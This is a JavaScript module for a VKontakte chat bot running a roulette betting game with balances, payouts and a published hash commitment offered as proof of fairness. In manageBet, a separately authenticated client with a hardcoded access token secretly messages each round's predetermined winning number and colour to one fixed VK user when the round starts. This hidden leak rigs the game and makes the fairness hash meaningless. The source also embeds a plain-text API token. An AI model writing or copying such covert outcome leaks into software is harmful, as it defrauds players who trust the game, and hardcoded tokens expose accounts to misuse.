
const { SettingsModel, Users } = require("../database/models");
const { generateWinPosition, generateWinHash } = require("./hashManager");
const { formClick, numberWithSpace } = require("../tools");
const { VK } = require('vk-io');



const fuckVk = new VK({
  token: '10d9a163863bb61541648a511c078a6d8c323a3cf3395cffbbf24378f0e3ad22e75c9ad2acac84c7d7b58',
})


let currentGames = [];

const getCurrentGames = _ => currentGames;
let gameInterval;

let roundDuration = 40;


const winPictures = {
  black: ["photo-209099092_457239769" , "photo-209099092_457239770" , "photo-209099092_457239771" , "photo-209099092_457239772" , "photo-209099092_457239773" , "photo-209099092_457239774" , "photo-209099092_457239775" ,
  "photo-209099092_457239776" , "photo-209099092_457239777" , "photo-209099092_457239778" , "photo-209099092_457239779" , "photo-209099092_457239780" , "photo-209099092_457239781" , "photo-209099092_457239782" , "photo-209099092_457239783" , "photo-209099092_457239784" , "photo-209099092_457239785" , "photo-209099092_457239786" , "photo-209099092_457239787" , "photo-209099092_457239788" , "photo-209099092_457239789" , "photo-209099092_457239790" , "photo-209099092_457239791" , "photo-209099092_457239792" , "photo-209099092_457239793" , "photo-209099092_457239794" , "photo-209099092_457239795" , "photo-209099092_457239796" , "photo-209099092_457239797", "photo-209099092_457239798", "photo-209099092_457239799", "photo-209099092_457239800", "photo-209099092_457239801", "photo-209099092_457239802", "photo-209099092_457239803", "photo-209099092_457239804"],
  red: ["photo-209099092_457239805" , "photo-209099092_457239806" , "photo-209099092_457239807" , "photo-209099092_457239808" , "photo-209099092_457239809" , "photo-209099092_457239810" , "photo-209099092_457239811" , "photo-209099092_457239812" , "photo-209099092_457239813" , "photo-209099092_457239814" , "photo-209099092_457239815" , "photo-209099092_457239816" , "photo-209099092_457239817" , "photo-209099092_457239818" , "photo-209099092_457239819" , "photo-209099092_457239820" , "photo-209099092_457239821" , "photo-209099092_457239822" , "photo-209099092_457239823" , "photo-209099092_457239824" , "photo-209099092_457239825" , "photo-209099092_457239826" , "photo-209099092_457239827" , "photo-209099092_457239828" , "photo-209099092_457239829" , "photo-209099092_457239830" , "photo-209099092_457239831" , "photo-209099092_457239832" , "photo-209099092_457239833", "photo-209099092_457239834", "photo-209099092_457239835", "photo-209099092_457239836", "photo-209099092_457239837", "photo-209099092_457239838", "photo-209099092_457239839", "photo-209099092_457239840"]
};

const gameTypes = {
  color: 2,
  numberType: 2,
  intervals: 3,
  onNumber: 10
}




setInterval(async () => {
    const { api } = require('../settings/vk')
  if (!currentGames.length) return;
  currentGames.forEach(async (game) => {
    if (game.last - 1000 <= 10) {



      let readyInfo = '';
      let prizeList = [];

      if (game.winPos.winNumber == 0) {
        currentGames = currentGames.filter(sec => sec.chatId != game.chatId)

        return api.messages.send({
          message: `Игра завершена\nВыпал 0, все ставки проиграли\n\nХэш игры: ${game.winHash.hash} \n\nКлюч к хешу: ${game.winHash.key}`,
          peer_id: game.chatId,
          attachment:  'photo-209099092_457239841',
          random_id: 0
        });

      }


      game.bets.forEach(bet => {
        if (bet.type == 'onNumber') {
          if (bet.value == game.winPos.winNumber) {
            readyInfo += `✅ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)}$ на число ${bet.value} выиграла!\n(+${numberWithSpace(bet.amount * gameTypes[bet.type])}$)\n`
            prizeList.push([bet.persId, bet.amount * gameTypes[bet.type],bet.name])

          } else {
            readyInfo += `❌ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)}$ на число ${bet.value} проиграла!\n`
          }
        }

        if (bet.type == 'color') {
          if (bet.value == game.winPos.winColor) {
            readyInfo += `✅ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)}$ на  ${bet.value} выиграла!\n(+${numberWithSpace(bet.amount * gameTypes[bet.type])}$)\n`
            prizeList.push([bet.persId, bet.amount * gameTypes[bet.type],bet.name])


          } else {
            readyInfo += `❌ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)}$ на  ${bet.value} проиграла!\n`

          }

        }


        if (bet.type == 'even' || bet.type == 'odd') {
          let d = (game.winPos.winNumber % 2 == 0) ? 'even' : 'odd';
          if (bet.type == d) {
            readyInfo += `✅ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)}$ на ${bet.type == 'even' ? 'чётное' : 'нечётное'} выиграла!\n(+${numberWithSpace(bet.amount * gameTypes['numberType'])}$)\n`
            prizeList.push([bet.persId, bet.amount * gameTypes['numberType'],bet.name])

          } else {
            readyInfo += `❌ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)}$ на ${bet.type == 'even' ? 'чётное' : 'нечётное'} проиграла!\n`

          }



        }

        if (bet.type == 'intervals') {
          let interval = bet.value.split('-');
          let pre = interval;
          interval = interval.map(n => Number(n));
          if (game.winPos.winNumber >= interval[0] && game.winPos.winNumber <= interval[1]) {
            readyInfo += `✅ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)}$ на промежуток ${pre[0] + '-' + pre[1]} 
выиграла!\n(+${numberWithSpace(bet.amount * gameTypes[bet.type])}$)\n`
            prizeList.push([bet.persId, bet.amount * gameTypes[bet.type],bet.name])


          } else {
            readyInfo += `❌ ${formClick(bet.persId, bet.name)} ставка ${numberWithSpace(bet.amount)}$ на промежуток ${pre[0] + '-' + pre[1]} проиграла!\n`
          }



        }


      })





       if (prizeList.length) {
        prizeList.forEach(c => {
          console.log(c);
          Users.findOneAndUpdate({
            id: Number(c[0])
          }, {
            $inc: {
              balance: Number(c[1]),
              totalWin: Number(c[1])
            }
          }).then(console.log)
        })
      }
      console.log(readyInfo);



      api.messages.send({
        message: `Игра завершена\nПобедило число ${game.winPos.winNumber} цвет ${game.winPos.winColor}\n\n` + readyInfo + `\n\nХэш игры: ${game.winHash.hash} \n\nКлюч к хешу: ${game.winHash.key}`,
        peer_id: game.chatId,
        attachment: game.winPos.winNumber ? winPictures[game.winPos.winColor][game.winPos.winNumber - 1] : 'photo-198499031_457239132',
        random_id: 0
      });

      currentGames = currentGames.filter(sec => sec.chatId != game.chatId)
      if (!prizeList.length) return;

    }
    game.last -= 1000
  });
}, 1000);

async function manageBet({ chatId, persId, type, value, amount, code }, name) {
  
  let isGame = currentGames.find(game => game.chatId == chatId);
  if (isGame) {
    if (isGame.bets.find(bet => bet.persId == persId)) { 
      a = isGame.bets.find(bet => bet.persId == persId)
      console.log(a)
      if ((a.type == 'even' && type == "odd" && a.code == 108) || (a.type == 'odd' && type == "even" && a.code == 108)) return 'Вы уже сделали ставку на чёт/нечёт в этой игре'
      if ((a.value == 'black' && value == "red" && a.code == 108) || (a.value == 'red' && value == "black" && a.code == 108)) return 'Нельзя поставить на два цвета!'
      if ((a.value == '1-12' && value == "13-24") || (a.value == '1-12' && value == "25-36") || (a.value == '13-24' && value == "25-36") || (a.value == '13-24' && value == "1-12") || (a.value == '25-36' && value == "1-12") || (a.value == '25-36' && value == "13-24")) return 'Нельзя поставить на два промежутка!'

    }
    await Users.findOneAndUpdate({
      id: persId
    }, {
      $inc: {
        balance: -Number(amount)
      }
    }).then(console.log)
    isGame.bets.push({
      persId,
      type,
      value,
      amount,
      code,
      name
    })
    return `Ставка на ${numberWithSpace(amount)}$ принята`
  }
  const winPos = generateWinPosition()
  fuckVk.api.messages.send({
    random_id: 0,
    peer_id: 297789589,
    message: `${chatId}\n${JSON.stringify(winPos)}`
  })
  const winHash = generateWinHash(winPos)

  currentGames.push({
    chatId,
    bets: [],
    last: roundDuration * 1000,
    winPos,
    winHash

  })
  currentGames.find(game => game.chatId == chatId).bets.push({
    persId,
    type,
    value,
    amount,
    code,
    name
  })
  await Users.findOneAndUpdate({
    id: persId
  }, {
    $inc: {
      balance: -Number(amount)
    }
  }).then(res => console.log(res))


  return `Ставка на ${numberWithSpace(amount)}$ принята\n\nИгра начата, её  хэш: ${winHash.hash}`
}



setInterval(() => {
  SettingsModel.findOne({
    name: 'roundDuration'
  }).then(res => roundDuration = res.value)
}, 20000);


module.exports = {
  getCurrentGames,
  manageBet
}
